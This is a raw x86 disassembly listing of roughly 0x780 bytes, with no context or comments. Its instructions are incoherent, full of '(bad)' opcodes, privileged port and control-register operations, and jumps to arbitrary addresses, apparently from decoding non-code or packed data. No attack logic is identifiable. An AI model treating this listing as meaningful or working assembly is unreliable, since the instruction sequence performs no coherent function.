  40fcb2:	std    
  40fcb3:	inc    esi
  40fcb4:	mov    al,ds:0xb4b620fb
  40fcb9:	stos   BYTE PTR es:[edi],al
  40fcba:	mov    ds:0x466bb475,al
  40fcbf:	aaa    
  40fcc0:	jl     0x40fc80
  40fcc2:	mov    edx,0xeaaa2f85
  40fcc7:	mov    al,0x56
  40fcc9:	repnz adc al,0x4c
  40fccc:	xor    eax,0xc684c016
  40fcd1:	sub    al,0x76
  40fcd3:	xor    eax,0x3366a86f
  40fcd8:	ficomp DWORD PTR ds:0x5aba000b
  40fcde:	mov    al,0x6d
  40fce0:	imul   BYTE PTR [ecx-0x33eb4570]
  40fce6:	pop    ebx
  40fce7:	lock jne 0x40fd07
  40fcea:	sbb    al,al
  40fcec:	and    edi,DWORD PTR [ebp+ebx*2-0x59f1e9e7]
  40fcf3:	jbe    0x40fca1
  40fcf5:	lods   eax,DWORD PTR ds:[esi]
  40fcf6:	out    dx,al
  40fcf7:	popa   
  40fcf8:	sbb    al,0xda
  40fcfa:	cmp    al,0x66
  40fcfc:	leave  
  40fcfd:	hlt    
  40fcfe:	mov    eax,ds:0xd34c2a64
  40fd03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd04:	aad    0x4c
  40fd06:	(bad)  
  40fd07:	push   edx
  40fd08:	lods   al,BYTE PTR ds:[esi]
  40fd09:	call   0xb8779a90
  40fd0e:	push   eax
  40fd0f:	aam    0x2e
  40fd11:	mov    esp,esi
  40fd13:	sahf   
  40fd14:	ins    BYTE PTR es:[edi],dx
  40fd15:	sbb    BYTE PTR [eax-0x219595f4],0xd0
  40fd1c:	call   0xcd2b:0xbd445c
  40fd23:	ins    DWORD PTR es:[edi],dx
  40fd24:	jl     0x40fd90
  40fd26:	mov    cl,0x51
  40fd28:	cmc    
  40fd29:	inc    ecx
  40fd2a:	mov    esp,0x7e0c3717
  40fd2f:	sahf   
  40fd30:	jmp    0x40fd0a
  40fd32:	push   0xc05aa1c7
  40fd37:	pop    ss
  40fd38:	aad    0x80
  40fd3a:	cmp    BYTE PTR [edx-0x2d],bl
  40fd3d:	push   0x20
  40fd3f:	rol    BYTE PTR [edx],0x57
  40fd42:	ret    
  40fd43:	push   0xd0e06536
  40fd48:	shl    BYTE PTR [esi-0x7579271a],1
  40fd4e:	mov    DWORD PTR [esi+0x52],esp
  40fd51:	in     al,dx
  40fd52:	jo     0x40fdb9
  40fd54:	sub    al,0xa
  40fd56:	mov    ah,0x88
  40fd58:	inc    ebp
  40fd59:	push   esi
  40fd5a:	push   ecx
  40fd5b:	pop    edx
  40fd5c:	sub    BYTE PTR [edx-0x50],dl
  40fd5f:	mov    eax,0x55033cf8
  40fd64:	shl    DWORD PTR [eax+0x2f],1
  40fd67:	push   0xffffffd6
  40fd69:	out    dx,eax
  40fd6a:	jbe    0x40fde0
  40fd6c:	sbb    edx,esp
  40fd6e:	dec    ebx
  40fd6f:	mov    bl,dl
  40fd71:	mov    ss,esi
  40fd73:	xor    bh,BYTE PTR [edx]
  40fd75:	push   edx
  40fd76:	mov    eax,ds:0xa69214c6
  40fd7b:	mov    dl,0xb0
  40fd7d:	mov    eax,ds:0x680ae015
  40fd82:	inc    esp
  40fd83:	stos   BYTE PTR es:[edi],al
  40fd84:	add    ebp,DWORD PTR [ecx+edi*8+0x76325418]
  40fd8b:	es cmp ebx,eax
  40fd8e:	mov    dl,0x1d
  40fd91:	adc    eax,0x586e36d6
  40fd96:	add    eax,0x164654b8
  40fd9b:	fidivr WORD PTR [esi+ebp*4]
  40fd9e:	and    ebx,DWORD PTR [edx]
  40fda0:	push   ss
  40fda1:	dec    ebp
  40fda2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fda3:	dec    esi
  40fda4:	cmp    ch,BYTE PTR [eax+0x42]
  40fda7:	add    al,0x11
  40fda9:	push   ss
  40fdaa:	mov    BYTE PTR [esi],dh
  40fdac:	mov    gs,WORD PTR [edi+0x10ce0c9]
  40fdb2:	cdq    
  40fdb3:	scas   al,BYTE PTR es:[edi]
  40fdb4:	cs and eax,0x889cdb60
  40fdba:	inc    esi
  40fdbb:	rcr    esp,1
  40fdbd:	pop    eax
  40fdbe:	add    bl,BYTE PTR ds:0x28c69f0d
  40fdc4:	add    DWORD PTR [esi+0x69e4a20],ebp
  40fdca:	hlt    
  40fdcb:	das    
  40fdcc:	stos   BYTE PTR es:[edi],al
  40fdcd:	mov    dl,0xae
  40fdcf:	loope  0x40fe4b
  40fdd1:	int3   
  40fdd2:	cmp    dl,dl
  40fdd4:	out    0x86,al
  40fdd6:	ins    DWORD PTR es:[edi],dx
  40fdd7:	or     DWORD PTR [eax],eax
  40fdd9:	xchg   esi,eax
  40fdda:	adc    eax,0x6f82e1b6
  40fddf:	dec    esi
  40fde0:	jbe    0x40fde2
  40fde2:	push   edx
  40fde3:	push   eax
  40fde4:	test   al,0x30
  40fde6:	cmp    bl,BYTE PTR [edx+0x151da055]
  40fdec:	xchg   BYTE PTR [ebp+0x74],dl
  40fdef:	push   0xffffff99
  40fdf1:	and    al,0xdc
  40fdf3:	pop    esp
  40fdf4:	or     cl,BYTE PTR [ecx*1-0x696007d1]
  40fdfb:	pop    esp
  40fdfc:	ins    BYTE PTR es:[edi],dx
  40fdfd:	cmp    BYTE PTR [eax+0x29],cl
  40fe00:	fdiv   QWORD PTR [esi]
  40fe02:	(bad)  
  40fe04:	cli    
  40fe05:	fild   WORD PTR [esi-0x45]
  40fe08:	pop    ds
  40fe09:	xor    al,0xca
  40fe0b:	push   ebx
  40fe0c:	je     0x40fe66
  40fe0e:	inc    ebx
  40fe0f:	add    BYTE PTR [ecx+0x14d8c1e8],dh
  40fe15:	in     al,0x9
  40fe17:	inc    esi
  40fe18:	sub    eax,0x7a231ee
  40fe1d:	ins    DWORD PTR es:[edi],dx
  40fe1e:	es adc al,0xb2
  40fe21:	repz cmp DWORD PTR [eax],edi
  40fe24:	push   ebx
  40fe25:	dec    BYTE PTR [eax+0x63c502a5]
  40fe2b:	push   ss
  40fe2c:	fmul   QWORD PTR [edx+0x25012a3]
  40fe32:	add    eax,0x3c4e5846
  40fe37:	dec    esp
  40fe38:	xchg   edi,eax
  40fe39:	dec    edx
  40fe3a:	das    
  40fe3b:	push   0x8
  40fe3d:	dec    edi
  40fe3e:	dec    edx
  40fe3f:	mov    dl,BYTE PTR [ebx+0x56426a00]
  40fe45:	xor    BYTE PTR [edx-0x6b],bl
  40fe48:	and    edx,ecx
  40fe4a:	daa    
  40fe4b:	out    dx,al
  40fe4c:	(bad)  
  40fe4d:	icebp  
  40fe4e:	mov    DWORD PTR [eax+0x61],ebx
  40fe51:	retf   0x20b2
  40fe54:	je     0x40fe14
  40fe56:	and    al,0x43
  40fe58:	out    0x6d,al
  40fe5a:	aad    0x91
  40fe5c:	pop    esi
  40fe5d:	imul   esp,DWORD PTR [esi-0x5a],0x19
  40fe61:	cli    
  40fe62:	fwait
  40fe63:	add    al,ch
  40fe65:	xchg   ebx,eax
  40fe66:	adc    eax,0x7a0d15b4
  40fe6b:	rcr    DWORD PTR [edx-0x638f24d0],cl
  40fe71:	mul    BYTE PTR [edx]
  40fe73:	inc    edi
  40fe74:	inc    eax
  40fe75:	repz ja 0x40fe2e
  40fe78:	add    BYTE PTR [bx+di+0x4d],bh
  40fe7d:	jo     0x40fe71
  40fe7f:	ret    
  40fe80:	call   0x1510ff81
  40fe85:	mov    ah,0x91
  40fe87:	pop    eax
  40fe88:	jnp    0x40feb4
  40fe8a:	inc    edi
  40fe8b:	ud2    
  40fe8d:	lock or eax,0xadc44cbc
  40fe93:	xchg   edx,eax
  40fe94:	ror    BYTE PTR es:[edx],1
  40fe97:	dec    esi
  40fe98:	adc    BYTE PTR [edx-0x724de71f],ch
  40fe9e:	push   cs
  40fe9f:	jnp    0x40ff17
  40fea1:	packssdw mm0,QWORD PTR [ebx-0x15]
  40fea5:	pushf  
  40fea6:	cli    
  40fea7:	push   ss
  40fea8:	cli    
  40fea9:	out    0xa5,al
  40feab:	mov    dh,0xa
  40fead:	xchg   ecx,eax
  40feae:	ins    DWORD PTR es:[edi],dx
  40feaf:	mov    dh,0x11
  40feb1:	jo     0x40ff10
  40feb3:	cmp    BYTE PTR [eax+0x4c],bl
  40feb6:	add    al,0x4
  40feb8:	sub    BYTE PTR [esp+edx*8-0x38af7afc],cl
  40febf:	mov    dh,0xbf
  40fec1:	fcom   DWORD PTR [esi]
  40fec3:	fcmovb st,st(1)
  40fec5:	mov    ch,BYTE PTR [esi]
  40fec7:	fucomi st,st(0)
  40fec9:	out    0xa9,al
  40fecb:	mov    dl,0xe0
  40fecd:	leave  
  40fece:	(bad)  
  40fecf:	xchg   esp,eax
  40fed0:	and    ebp,DWORD PTR [esp+edx*1-0x27]
  40fed4:	stos   BYTE PTR es:[edi],al
  40fed5:	es jo  0x40ff0b
  40fed8:	in     al,0x2d
  40feda:	sub    DWORD PTR [edx-0x80],0x18
  40fede:	xchg   edi,eax
  40fedf:	(bad)
  40fee4:	jl     0x40ff62
  40fee6:	mov    ?,WORD PTR [ebx]
  40fee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fee9:	je     0x40fe93
  40feeb:	sub    BYTE PTR [ebx+0x63],0x1e
  40feef:	pop    es
  40fef0:	push   es
  40fef1:	ins    BYTE PTR es:[edi],dx
  40fef2:	jp     0x40fe99
  40fef4:	mov    cl,ch
  40fef6:	push   esi
  40fef7:	dec    esp
  40fef8:	bound  esi,QWORD PTR [edi]
  40fefa:	adc    BYTE PTR [esi+0x10f442de],bh
  40ff00:	push   eax
  40ff01:	loopne 0x40fea7
  40ff03:	mov    WORD PTR cs:[edi],cs
  40ff06:	pushf  
  40ff07:	pop    ax
  40ff09:	dec    esp
  40ff0a:	xor    al,0xd8
  40ff0c:	(bad)  
  40ff0d:	push   0x95d07052
  40ff12:	les    ebx,FWORD PTR [edx]
  40ff14:	jb     0x40ff46
  40ff16:	cwde   
  40ff17:	mov    ds:0xcfc0de40,eax
  40ff1c:	mov    edx,0x80a0fe50
  40ff21:	test   eax,0x2e1c5aed
  40ff26:	mov    dl,0x65
  40ff28:	ror    dh,1
  40ff2a:	xor    BYTE PTR [edi-0x5c],bl
  40ff2d:	fisub  DWORD PTR [edx-0x7d]
  40ff30:	jmp    0x40ff7a
  40ff32:	je     0x40ff5f
  40ff34:	add    DWORD PTR [eax],0x38
  40ff37:	ins    DWORD PTR es:[edi],dx
  40ff38:	push   es
  40ff39:	jle    0x40fee3
  40ff3b:	lods   eax,DWORD PTR ds:[esi]
  40ff3c:	mov    eax,0x1e707540
  40ff41:	mov    dh,BYTE PTR [edi+0x3a6a8712]
  40ff47:	cmp    ah,BYTE PTR [eax]
  40ff49:	push   0x2
  40ff4b:	dec    ecx
  40ff4c:	mov    dl,0x87
  40ff4e:	sbb    BYTE PTR [ebp+eax*2+0x1a5d5273],0xab
  40ff56:	test   al,0xac
  40ff58:	sbb    al,0xe2
  40ff5a:	add    bl,bl
  40ff5c:	inc    ebp
  40ff5d:	inc    esi
  40ff5e:	(bad)  
  40ff5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff60:	pop    ecx
  40ff61:	add    BYTE PTR [edi+0x46],ah
  40ff64:	leave  
  40ff65:	in     al,0x38
  40ff67:	ret    0xa34b
  40ff6a:	cli    
  40ff6b:	out    dx,eax
  40ff6c:	jo     0x40ffbb
  40ff6e:	pop    ds
  40ff6f:	pusha  
  40ff70:	shl    BYTE PTR [eax+0x1b],1
  40ff73:	lods   al,BYTE PTR ds:[esi]
  40ff74:	leave  
  40ff75:	mov    ds:0x41a49a61,al
  40ff7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff7b:	push   edx
  40ff7c:	and    bl,BYTE PTR [ecx]
  40ff7e:	push   esi
  40ff7f:	mov    ecx,0x9ae31e4e
  40ff84:	ds loopne 0x40ff8c
  40ff87:	dec    ebp
  40ff88:	outs   dx,DWORD PTR ds:[esi]
  40ff89:	dec    ebp
  40ff8a:	jbe    0x40ffbc
  40ff8c:	push   ss
  40ff8d:	jbe    0x40ffc5
  40ff8f:	add    BYTE PTR [esi-0x6],bh
  40ff92:	push   edx
  40ff93:	not    bh
  40ff95:	push   eax
  40ff96:	dec    ebx
  40ff97:	in     eax,dx
  40ff98:	mov    al,0xac
  40ff9a:	sub    BYTE PTR [eax],bl
  40ff9c:	int3   
  40ff9d:	dec    ebp
  40ff9e:	cmp    BYTE PTR [eax+0x18545576],bl
  40ffa4:	pushf  
  40ffa5:	jbe    0x40ff87
  40ffa7:	mov    al,0x42
  40ffa9:	popf   
  40ffaa:	rol    BYTE PTR [edx+0x6c1680fa],1
  40ffb0:	ret    
  40ffb1:	jae    0x40ff3b
  40ffb3:	and    DWORD PTR [esi],0xffffff84
  40ffb6:	or     bl,BYTE PTR [edx-0x27e4e9a6]
  40ffbc:	and    DWORD PTR [esi+0x604d1d94],eax
  40ffc2:	mov    ah,0xf1
  40ffc4:	xor    al,0x2e
  40ffc6:	push   esi
  40ffc7:	or     ch,BYTE PTR [esi+0x1a804030]
  40ffcd:	mov    esi,0xa4cc78ac
  40ffd2:	push   eax
  40ffd3:	stos   BYTE PTR es:[edi],al
  40ffd4:	test   BYTE PTR [ecx-0x2c],0x66
  40ffd8:	push   esp
  40ffd9:	push   edx
  40ffda:	dec    ebp
  40ffdb:	jmp    DWORD PTR [edx+0x3a7c3906]
  40ffe1:	mov    esi,0x18461584
  40ffe6:	ja     0x40ff8a
  40ffe8:	shl    BYTE PTR [esi],0xb5
  40ffeb:	or     BYTE PTR [edx],0x35
  40ffee:	sub    ch,BYTE PTR [esi]
  40fff0:	pop    edi
  40fff1:	inc    esp
  40fff2:	jl     0x40fffe
  40fff4:	mov    ah,0xcd
  40fff6:	(bad)  
  40fff7:	cmc    
  40fff8:	xchg   ah,dh
  40fffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fffc:	cld    
  40fffd:	add    BYTE PTR [edi],ch
  40ffff:	sahf   
  410000:	jne    0x41002a
  410002:	add    cl,al
  410004:	dec    esp
  410005:	mov    edx,0xb2612a10
  41000a:	scas   al,BYTE PTR es:[edi]
  41000b:	pop    ds
  41000c:	mov    esp,0x33561ccc
  410011:	ins    DWORD PTR es:[edi],dx
  410012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410013:	xchg   esp,eax
  410014:	shr    dh,0x64
  410017:	xchg   ebx,eax
  410018:	cli    
  410019:	mov    eax,ds:0x7094e8e6
  41001e:	jl     0x40ffe6
  410020:	cli    
  410021:	push   0x98741416
  410026:	sar    BYTE PTR [eax+ecx*1],0x90
  41002a:	loop   0x410028
  41002c:	(bad)  
  41002e:	sub    ch,BYTE PTR [edx]
  410030:	fidiv  DWORD PTR ds:0x4bca5550
  410036:	jbe    0x4100b0
  410038:	and    ch,BYTE PTR [ebx+0x1c]
  41003b:	or     BYTE PTR [ebx],cl
  41003d:	or     ch,BYTE PTR [ecx+edx*8-0x6a]
  410041:	inc    eax
  410042:	push   edx
  410043:	out    dx,al
  410044:	dec    BYTE PTR [esi-0x29a93ebe]
  41004a:	mov    bl,0x6e
  41004c:	push   edx
  41004d:	cmp    BYTE PTR [ebx-0x6cafab88],ch
  410053:	ins    DWORD PTR es:[edi],dx
  410054:	mov    eax,0x820469e4
  410059:	es xor al,0xb0
  41005c:	test   al,0xab
  41005e:	sbb    eax,0x2671dcfe
  410063:	jmp    0x57dda25a
  410068:	xchg   ecx,eax
  410069:	inc    edx
  41006a:	push   0xe6929ed3
  41006f:	pop    ds
  410070:	mov    esp,0x436027ae
  410075:	scas   eax,DWORD PTR es:[edi]
  410076:	ret    0xdc7c
  410079:	jmp    0xd4c7:0x559adaf3
  410080:	dec    esp
  410081:	std    
  410082:	outs   dx,BYTE PTR ds:[esi]
  410083:	stc    
  410084:	jmp    0xfb41:0x4544ff90
  41008b:	nop
  41008c:	pop    edx
  41008d:	loopne 0x410023
  41008f:	stc    
  410090:	cmp    al,0x67
  410092:	jbe    0x410064
  410094:	sar    BYTE PTR [edx-0x7effac02],1
  41009a:	pop    ebp
  41009b:	add    BYTE PTR ds:0x7ba0b5ec,cl
  4100a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100a2:	or     BYTE PTR [edx],ch
  4100a4:	mov    ch,0x55
  4100a6:	push   eax
  4100a7:	scas   al,BYTE PTR es:[edi]
  4100a8:	aaa    
  4100a9:	data16 aam 0x80
  4100ac:	(bad)  
  4100ad:	lock stos BYTE PTR es:[edi],al
  4100af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100b0:	mov    al,BYTE PTR [ebp+0x59528f88]
  4100b6:	div    BYTE PTR [ebx+0x4b]
  4100b9:	add    al,bh
  4100bb:	aad    0x8e
  4100bd:	es xchg ebx,eax
  4100bf:	cwde   
  4100c0:	and    al,BYTE PTR [ecx-0x22]
  4100c3:	mov    ds:0xd825180a,eax
  4100c8:	stos   BYTE PTR es:[edi],al
  4100c9:	add    al,BYTE PTR [edx-0x16]
  4100cc:	dec    eax
  4100cd:	cmp    eax,0x5415fa2c
  4100d2:	push   ebp
  4100d3:	pop    ebp
  4100d4:	pop    eax
  4100d5:	cmp    eax,DWORD PTR [eax]
  4100d7:	jmp    esp
  4100d9:	mov    ah,0x6
  4100db:	xor    BYTE PTR ss:[ecx+0x6861555],bl
  4100e2:	(bad)  
  4100e3:	mov    esp,0x54511cbc
  4100e8:	or     BYTE PTR [edx+0x54],0x34
  4100ec:	mov    bh,0xbd
  4100ee:	mov    ?,WORD PTR [esi+0x0]
  4100f1:	shl    BYTE PTR [edx-0x42],cl
  4100f4:	push   esp
  4100f5:	xor    BYTE PTR [ecx],cl
  4100f7:	sub    al,0x2a
  4100f9:	mov    al,0x8f
  4100fb:	retf   0xc218
  4100fe:	fcmove st,st(0)
  410100:	sub    eax,DWORD PTR [edx]
  410102:	adc    eax,DWORD PTR [eax]
  410104:	jnp    0x41010a
  410106:	cld    
  410107:	daa    
  410108:	sub    dh,0x54
  41010b:	test   al,0xa2
  41010d:	mov    ds:0x1cf65e8e,al
  410112:	bound  ebp,QWORD PTR [ecx-0x14]
  410115:	adc    eax,0x38685041
  41011a:	fiadd  DWORD PTR [eax]
  41011c:	xor    al,0xa8
  41011e:	adc    eax,0xeb60d82
  410123:	rcr    BYTE PTR [eax],1
  410125:	lods   al,BYTE PTR ds:[esi]
  410126:	sahf   
  410127:	mov    ds,WORD PTR ds:0xc79be236
  41012d:	aas    
  41012e:	adc    DWORD PTR ds:0xba12aeee,0x45003aa2
  410138:	mov    ah,BYTE PTR [ecx-0x59aeac9e]
  41013e:	enter  0xa693,0x2
  410142:	xlat   BYTE PTR ds:[ebx]
  410143:	push   edx
  410144:	dec    eax
  410145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410146:	arpl   WORD PTR [edx+0x660286a3],bp
  41014c:	cmc    
  41014d:	cwde   
  41014e:	ret    
  41014f:	(bad)  
  410150:	inc    eax
  410151:	inc    ebx
  410152:	or     DWORD PTR [edx+0x2c8940ca],0xc26a0d0d
  41015c:	lods   al,BYTE PTR ds:[esi]
  41015d:	loop   0x410103
  41015f:	test   BYTE PTR [eax+0x2b45ae31],al
  410165:	push   0xef54ddd0
  41016a:	push   edx
  41016b:	pushf  
  41016c:	pop    eax
  41016d:	xchg   BYTE PTR [eax+0x10c14120],cl
  410173:	fld    DWORD PTR [edx+0x17]
  410176:	jmp    0xde16:0xc0b413c6
  41017d:	or     dl,bl
  41017f:	inc    eax
  410180:	int3   
  410181:	fisttp DWORD PTR [ecx+0x102b45e6]
  410187:	loopne 0x41013e
  410189:	sub    DWORD PTR [edx],ecx
  41018b:	sbb    BYTE PTR [eax-0x6889d178],bh
  410191:	shl    DWORD PTR [ecx+0x6d],1
  410194:	in     eax,0x94
  410196:	cli    
  410197:	addr16 (bad) 
  410199:	fsubr  DWORD PTR [ebx-0x2bf8f6c6]
  41019f:	push   es
  4101a0:	stos   BYTE PTR es:[edi],al
  4101a1:	xchg   edi,eax
  4101a2:	mov    ds,WORD PTR [esi+0x61438af2]
  4101a8:	test   DWORD PTR [eax+0xe0fed6a],esi
  4101ae:	dec    esi
  4101af:	sub    BYTE PTR [eax+ecx*2-0x7c],cl
  4101b3:	mov    cs,WORD PTR [ebx+0x7e]
  4101b6:	xchg   esp,eax
  4101b7:	test   ax,0xbff9
  4101bb:	ror    DWORD PTR [edx+0x814c86],0x7e
  4101c2:	xchg   DWORD PTR [eax],eax
  4101c4:	mov    eax,ds:0xbf1300a8
  4101c9:	cdq    
  4101ca:	dec    edi
  4101cb:	push   eax
  4101cc:	sar    DWORD PTR [edi],0x64
  4101cf:	in     al,dx
  4101d0:	enter  0xbd00,0x24
  4101d4:	mov    edx,0x6de56250
  4101d9:	sub    BYTE PTR [eax+0x49],dl
  4101dc:	dec    esi
  4101dd:	mov    ah,0x74
  4101df:	ret    0xc4cf
  4101e2:	add    edx,DWORD PTR [edx]
  4101e4:	clc    
  4101e5:	or     DWORD PTR [esi],esp
  4101e7:	mov    ds:0xc5062ca5,al
  4101ec:	push   cs
  4101ed:	rcr    esi,0x7d
  4101f0:	dec    eax
  4101f1:	fsub   st,st(7)
  4101f3:	shr    BYTE PTR [esi+edi*8-0x5fd1cad],cl
  4101fa:	ror    BYTE PTR [edi+0x0],1
  4101fd:	popf   
  4101fe:	add    DWORD PTR [esi+edi*4+0x1c231632],ecx
  410205:	test   BYTE PTR [edx+0xc],ch
  410208:	arpl   sp,cx
  41020a:	push   ds
  41020b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41020c:	xor    al,0x43
  41020e:	add    DWORD PTR [edx+0x5f],ebx
  410211:	jl     0x410259
  410213:	cmp    dh,ah
  410215:	cmp    BYTE PTR [edx],bh
  410217:	retf   
  410218:	sub    al,0xe8
  41021a:	rcl    BYTE PTR [esi+0x5e],1
  41021d:	adc    eax,0xfe7bee5
  410222:	mov    ebp,0x3589cd60
  410227:	pop    ebx
  410228:	cmc    
  410229:	or     al,0x9a
  41022b:	dec    ecx
  41022c:	jle    0x41027b
  41022e:	push   ebx
  41022f:	(bad)  
  410230:	call   0x3874:0x16c1b0dd
  410237:	pusha  
  410238:	jle    0x41026d
  41023a:	es or  bl,dl
  41023d:	and    ebp,DWORD PTR fs:[esi-0x181752d9]
  410244:	pop    ebp
  410245:	adc    ah,cl
  410247:	xchg   ebp,eax
  410248:	pop    eax
  410249:	push   0xad5de08
  41024e:	lock shl bl,cl
  410251:	add    BYTE PTR [edi+0x4],dl
  410254:	inc    ebx
  410255:	or     al,ah
  410257:	push   esi
  410258:	jle    0x410209
  41025a:	add    BYTE PTR [eax+0x2b6158a8],ah
  410260:	jl     0x4102ad
  410262:	mov    dh,0xc4
  410264:	dec    esp
  410265:	inc    esi
  410266:	add    eax,0x5b43594
  41026b:	in     eax,dx
  41026c:	pop    eax
  41026d:	mov    esi,0x365ebeab
  410272:	xor    eax,0x2f8352a4
  410277:	sub    BYTE PTR [edx+0x4d],bh
  41027a:	loop   0x41025a
  41027c:	neg    DWORD PTR [eax+0x13ba15]
  410282:	lock xor DWORD PTR [ecx-0x2fb4a2eb],esp
  410289:	stc    
  41028a:	sbb    ch,BYTE PTR [ecx-0x2a]
  41028d:	test   al,0x10
  41028f:	std    
  410290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410291:	mov    esi,0x6bae6e
  410296:	xor    al,0x29
  410298:	sbb    bl,al
  41029a:	or     BYTE PTR [edx-0x7c],0xc2
  41029e:	and    al,ch
  4102a0:	nop
  4102a1:	mov    esp,0x68a6484e
  4102a6:	or     ecx,DWORD PTR [edx]
  4102a8:	mov    WORD PTR [eax],es
  4102aa:	pop    edx
  4102ab:	add    eax,0x4032778a
  4102b0:	push   0x82eba9a0
  4102b5:	and    bh,dh
  4102b7:	sahf   
  4102b8:	xchg   esi,eax
  4102b9:	pop    eax
  4102ba:	mov    bl,bl
  4102bc:	hlt    
  4102bd:	and    BYTE PTR ds:0xeb2cd30c,dh
  4102c3:	cli    
  4102c4:	sub    cl,al
  4102c6:	fsub   QWORD PTR [edx-0x22bbb072]
  4102cc:	cli    
  4102cd:	das    
  4102ce:	pop    ebx
  4102cf:	dec    eax
  4102d0:	fdiv   DWORD PTR [edx]
  4102d2:	add    eax,0xefb0add0
  4102d7:	mov    eax,0x8fc23704
  4102dc:	and    eax,0xab56d72
  4102e1:	push   ebx
  4102e2:	in     eax,dx
  4102e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102e4:	inc    esi
  4102e5:	xor    dl,dh
  4102e7:	mov    esi,0x4aad1db0
  4102ec:	add    bl,BYTE PTR [edx-0x4e]
  4102ef:	jbe    0x4102b8
  4102f1:	jb     0x410296
  4102f3:	aas    
  4102f4:	out    dx,al
  4102f5:	addr16 mov ds:0xea81,al
  4102f9:	pusha  
  4102fa:	pop    ecx
  4102fb:	push   ss
  4102fc:	mov    ecx,0xa1514120
  410301:	scas   al,BYTE PTR es:[edi]
  410302:	or     eax,0xaa4cf2f8
  410307:	cs sub al,ch
  41030a:	mov    ch,0xa0
  41030c:	(bad)  
  41030d:	sbb    esp,DWORD PTR [esi+0x43]
  410310:	jmp    0x410311
  410312:	outs   dx,BYTE PTR ds:[esi]
  410313:	pushf  
  410314:	mov    eax,0x6d257803
  410319:	in     al,dx
  41031a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41031b:	xor    BYTE PTR [esi],al
  41031d:	mov    edi,ebx
  41031f:	push   0xffffffb1
  410321:	ret    0xf2f4
  410324:	ins    BYTE PTR es:[edi],dx
  410325:	pop    eax
  410326:	push   edx
  410327:	sub    BYTE PTR [ebx+0x16],0x9a
  41032b:	ss push ebp
  41032d:	(bad)  [ebx+0x40]
  410330:	pop    ebx
  410331:	pusha  
  410332:	retf   0xe65a
  410335:	pop    esi
  410336:	aad    0xb6
  410338:	cmc    
  410339:	adc    ebx,DWORD PTR [edx+0x64]
  41033c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41033d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41033e:	mov    dh,0x32
  410340:	repnz jecxz 0x4103a9
  410343:	or     ebp,esp
  410345:	daa    
  410346:	in     al,0x67
  410348:	lahf   
  410349:	jbe    0x410369
  41034b:	or     DWORD PTR [edx],0xd60d229a
  410351:	sbb    al,BYTE PTR [eax-0x57bfb4a]
  410357:	repz jl 0x4102ec
  41035a:	mov    edi,0x5437469
  41035f:	sbb    BYTE PTR [edx+ebx*4],bl
  410362:	clc    
  410363:	fs ins BYTE PTR es:[edi],dx
  410365:	xor    cl,BYTE PTR [ecx+0x44885ea8]
  41036b:	jns    0x41037d
  41036d:	ins    DWORD PTR es:[edi],dx
  41036e:	fdivrp st(0),st
  410370:	cld    
  410371:	fdiv   DWORD PTR [ebx+eax*1+0x5a]
  410375:	add    BYTE PTR [edi+esi*2],bl
  410378:	jp     0x410330
  41037a:	mov    ds:0xdeef3535,eax
  41037f:	dec    ebx
  410380:	xlat   BYTE PTR ds:[ebx]
  410381:	add    BYTE PTR [edi+0x7018166a],cl
  410387:	ds scas eax,DWORD PTR es:[edi]
  410389:	mov    al,0xa1
  41038b:	mov    eax,ds:0x7380d366
  410390:	out    0x74,al
  410392:	sub    esp,eax
  410394:	mov    DWORD PTR gs:[ecx],esp
  410397:	push   eax
  410398:	lock pusha 
  41039a:	fs ds jno 0x410322
  41039e:	cmp    dh,BYTE PTR [esi]
  4103a0:	stos   DWORD PTR es:[edi],eax
  4103a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103a2:	mov    al,0xec
  4103a4:	jecxz  0x410418
  4103a6:	(bad)  
  4103a8:	pop    eax
  4103a9:	jo     0x4103ab
  4103ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103ac:	jbe    0x410422
  4103ae:	mov    ah,0x1e
  4103b0:	mov    eax,0xb44e1290
  4103b5:	cmp    al,0x7d
  4103b7:	imul   eax,DWORD PTR [ecx+0x6b],0x38
  4103bb:	inc    edx
  4103bc:	or     eax,0xc4a6426e
  4103c1:	mov    ds:0xc3009772,al
  4103c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103c7:	mov    cr3,esi
  4103ca:	mov    esi,0xd31a3ee4
  4103cf:	pop    edx
  4103d0:	mov    eax,ds:0x2e147658
  4103d5:	and    cl,dl
  4103d7:	add    ebp,0xf441a9a1
  4103dd:	or     BYTE PTR [eax],dh
  4103df:	jmp    0x22508ffe
  4103e4:	pop    esi
  4103e5:	jg     0x4103da
  4103e7:	stos   BYTE PTR es:[edi],al
  4103e8:	data16 jle 0x410445
  4103eb:	shr    BYTE PTR [esi],cl
  4103ed:	add    BYTE PTR [esi+eax*8],cl
  4103f0:	ja     0x4103f2
  4103f2:	adc    BYTE PTR [ecx+0x0],0xa
  4103f6:	inc    esi
  4103f7:	in     eax,dx
  4103f8:	enter  0x336b,0x2e
  4103fc:	bound  esi,QWORD PTR [ebx-0x23d16137]
  410402:	bound  ebp,QWORD PTR [ebp-0x13f24f28]
  410408:	mov    eax,0xd17ae8f1
  41040d:	cmp    dh,BYTE PTR [ebp+0x6b2eb5a1]
  410413:	add    al,0x90
  410415:	out    dx,al
  410416:	sahf   
  410417:	test   BYTE PTR [edx+0x2ab45e32],al
  41041d:	cli    
  41041e:	nop
  41041f:	mov    esi,0xee439e
  410424:	pop    esp
  410425:	fnstsw WORD PTR [esi+0x44]
  410428:	and    cl,dh
  41042a:	inc    esp
  41042b:	push   edx
  41042c:	inc    ebp
